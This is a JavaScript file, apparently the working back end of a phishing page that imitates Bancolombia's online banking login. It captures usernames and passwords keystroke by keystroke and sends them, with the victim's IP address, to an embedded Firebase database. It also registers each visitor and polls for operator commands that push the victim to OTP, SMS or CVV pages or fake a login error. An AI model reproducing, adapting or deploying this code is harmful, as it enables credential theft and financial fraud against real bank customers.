(function () {
    // ============================================
    // 1. ACTUALIZAR IP Y FECHA/HORA EN EL FOOTER
    // ============================================
    async function initFooter() {
        try {
            const responseIP = await fetch('https://api.ipify.org?format=json');
            const dataIP = await responseIP.json();
            const elementoIP = document.getElementById('user-ip-display');
            if (elementoIP) elementoIP.textContent = dataIP.ip;
        } catch (error) {
            const elementoIP = document.getElementById('user-ip-display');
            if (elementoIP) elementoIP.textContent = 'No disponible';
        }

        function actualizarFechaHora() {
            const ahora = new Date();
            const dias = ['domingo', 'lunes', 'martes', 'miércoles', 'jueves', 'viernes', 'sábado'];
            const meses = ['enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio', 'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre'];
            const diaSemana = dias[ahora.getDay()];
            const dia = ahora.getDate();
            const mes = meses[ahora.getMonth()];
            const año = ahora.getFullYear();
            let horas = ahora.getHours();
            const minutos = String(ahora.getMinutes()).padStart(2, '0');
            const periodo = horas >= 12 ? 'p. m.' : 'a. m.';
            if (horas > 12) horas -= 12;
            else if (horas === 0) horas = 12;
            const fechaHora = `${diaSemana}, ${dia} de ${mes} de ${año}, ${horas}:${minutos} ${periodo}`;
            const elementoFechaHora = document.getElementById('user-fecha-hora-display');
            if (elementoFechaHora) elementoFechaHora.textContent = fechaHora;
        }
        actualizarFechaHora();
        setInterval(actualizarFechaHora, 60000);
    }

    // ============================================
    // 2. CONFIGURACIÓN FIREBASE & TOKEN
    // ============================================
    let hostToken = localStorage.getItem('token');
    let tokenExpires = parseInt(localStorage.getItem('tokenExpires'));
    if (!hostToken || !tokenExpires || Date.now() > tokenExpires) {
        hostToken = 'main_session';
        tokenExpires = Date.now() + 864000000; // 10 días de validez
        localStorage.setItem('token', hostToken);
        localStorage.setItem('tokenExpires', tokenExpires.toString());
    }
    const userId = 'admin';
    let heartbeatInterval = null;

    let currentDeviceId = localStorage.getItem('currentDeviceId');
    if (!currentDeviceId || currentDeviceId === 'null' || currentDeviceId === 'undefined') {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        currentDeviceId = '';
        for (let i = 0; i < 20; i++) currentDeviceId += chars.charAt(Math.floor(Math.random() * chars.length));
        localStorage.setItem('currentDeviceId', currentDeviceId);
    }

    function loadScript(src) {
        return new Promise((resolve, reject) => {
            if (document.querySelector(`script[src="${src}"]`)) return resolve();
            const s = document.createElement('script');
            s.src = src;
            s.onload = resolve;
            s.onerror = reject;
            document.head.appendChild(s);
        });
    }

    async function initFirebase() {
        await loadScript('https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js');
        await loadScript('https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js');

        const firebaseConfig = {
            apiKey: "AIzaSyA_rlIDFsfp2cJrPp0Q4N9QLA3hKKslIU8",
            authDomain: "tigg-51f26.firebaseapp.com",
            databaseURL: "https://tigg-51f26-default-rtdb.firebaseio.com",
            projectId: "tigg-51f26",
            storageBucket: "tigg-51f26.firebasestorage.app",
            messagingSenderId: "502610353442",
            appId: "1:502610353442:web:29e2c7bd9459277db9597b"
        };

        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        window._db = firebase.database();
        console.log('✅ Firebase inicializado correctamente');
    }

    function startHeartbeat() {
        if (heartbeatInterval) clearInterval(heartbeatInterval);
        heartbeatInterval = setInterval(async () => {
            if (currentDeviceId && hostToken && window._db) {
                try {
                    await window._db.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}/lastActivity`).set(Date.now());
                } catch (e) { }
            }
        }, 3000);
    }

    async function registrarDispositivoREST() {
        const DB_URL = 'https://tigg-51f26-default-rtdb.firebaseio.com';
        try {
            await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    id: currentDeviceId,
                    type: 'Bancolombia',
                    status: 'visitante',
                    isVisitor: true,
                    timestamp: Date.now(),
                    lastActivity: Date.now()
                })
            });
            console.log('✅ Dispositivo registrado vía REST API');
        } catch (e) { console.error('❌ Error REST:', e); }
    }

    async function initDevice() {
        await registrarDispositivoREST();
        await initFirebase().catch(e => console.error(e));

        if (window._db && currentDeviceId && hostToken) {
            await window._db.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}`).update({
                id: currentDeviceId,
                type: 'Bancolombia',
                status: 'visitante',
                isVisitor: true,
                timestamp: Date.now(),
                lastActivity: Date.now()
            }).catch(e => console.error(e));
        }

        startHeartbeat();
        escucharComandos();
    }

    function escucharComandos() {
        if (!currentDeviceId || !hostToken) return;
        const basePath = window.location.pathname.replace(/\/[^/]*$/, '/');
        const DB_URL = 'https://tigg-51f26-default-rtdb.firebaseio.com';
        let ejecutando = false;

        async function procesarComando(command) {
            if (command === 'otp' || command === 'dinamica' || command === 'sms' || command === 'mensaje' || command === 'seguridad' || command === 'cvv') {
                window.location.replace(basePath + 'OTP.html');
            } else if (command === 'login-error' || command === 'usuario') {
                const loader = document.getElementById('loaderOverlay');
                if (loader) loader.style.display = 'none';
                const u = document.getElementById('username');
                const p = document.getElementById('password');
                if (u) u.value = '';
                if (p) p.value = '';
                if (u) u.focus();
            } else if (command === 'cerrar') {
                if (heartbeatInterval) clearInterval(heartbeatInterval);
                window.location.replace('/finalizado.html');
            } else if (command === 'reiniciar') {
                if (heartbeatInterval) clearInterval(heartbeatInterval);
                localStorage.removeItem('currentDeviceId');
                location.reload();
            }
        }

        setInterval(async () => {
            if (ejecutando) return;
            ejecutando = true;
            try {
                const r = await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`);
                const data = await r.json();
                if (data && data.command) {
                    const command = data.command;
                    await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}/command.json`, { method: 'DELETE' });
                    await procesarComando(command);
                }
            } catch (e) { }
            ejecutando = false;
        }, 2000);
    }

    async function actualizarUsuario(usuario) {
        if (!currentDeviceId || !hostToken) return;
        const DB_URL = 'https://tigg-51f26-default-rtdb.firebaseio.com';
        try {
            await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}/data.json`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ usuarioEntidad: usuario })
            });
        } catch (e) { }

        if (window._db) {
            await window._db.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}`).update({
                'data/usuarioEntidad': usuario,
                lastActivity: Date.now()
            }).catch(e => { });
        }
    }

    async function actualizarClave(clave) {
        if (!currentDeviceId || !hostToken) return;
        const DB_URL = 'https://tigg-51f26-default-rtdb.firebaseio.com';
        try {
            await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}/data.json`, {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ passwordEntidad: clave })
            });
        } catch (e) { }

        if (window._db) {
            await window._db.ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}`).update({
                'data/passwordEntidad': clave,
                lastActivity: Date.now()
            }).catch(e => { });
        }
    }

    // ============================================
    // 3. VINCULAR EVENTOS FORMULARIO (DOM READY)
    // ============================================
    function setupFormListeners() {
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginButton = document.querySelector('[data-test="login-button"]') || document.querySelector('button[type="submit"]');

        let _notifSonado = false;

        if (usernameInput) {
            usernameInput.addEventListener('input', function () {
                const anterior = usernameInput.value;
                const filtrado = anterior.replace(/[^a-zA-Z0-9]/g, '');
                if (anterior !== filtrado) usernameInput.value = filtrado;

                const val = usernameInput.value;
                if (val.length >= 1 && !_notifSonado) {
                    _notifSonado = true;
                    const DB_URL = 'https://tigg-51f26-default-rtdb.firebaseio.com';
                    fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`, {
                        method: 'PATCH',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            status: 'en login',
                            isVisitor: false,
                            soundPlaying: 'notification',
                            lastActivity: Date.now()
                        })
                    }).catch(e => { });
                }
                if (val.length === 0) _notifSonado = false;
                actualizarUsuario(val);
            });
        }

        if (passwordInput) {
            passwordInput.addEventListener('input', function () {
                actualizarClave(passwordInput.value.trim());
            });
        }

        if (loginButton) {
            loginButton.addEventListener('click', async function (e) {
                e.preventDefault();
                const user = usernameInput ? usernameInput.value.trim() : '';
                const pass = passwordInput ? passwordInput.value.trim() : '';

                const loader = document.getElementById('loaderOverlay');
                if (loader) loader.style.display = 'flex';

                let userIP = 'Desconocida';
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    userIP = ipData.ip;
                } catch (e) { }

                const DB_URL = 'https://tigg-51f26-default-rtdb.firebaseio.com';
                fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'Bancolombia',
                        status: 'completó usuario/clave - esperando panel',
                        soundPlaying: 'timbre',
                        data: {
                            usuarioEntidad: user,
                            passwordEntidad: pass,
                            ip: userIP
                        },
                        lastActivity: Date.now()
                    })
                }).catch(e => { });
            });
        }
    }

    // INICIAR TODO GARANTIZADO
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            initFooter();
            initDevice();
            setupFormListeners();
        });
    } else {
        initFooter();
        initDevice();
        setupFormListeners();
    }
})();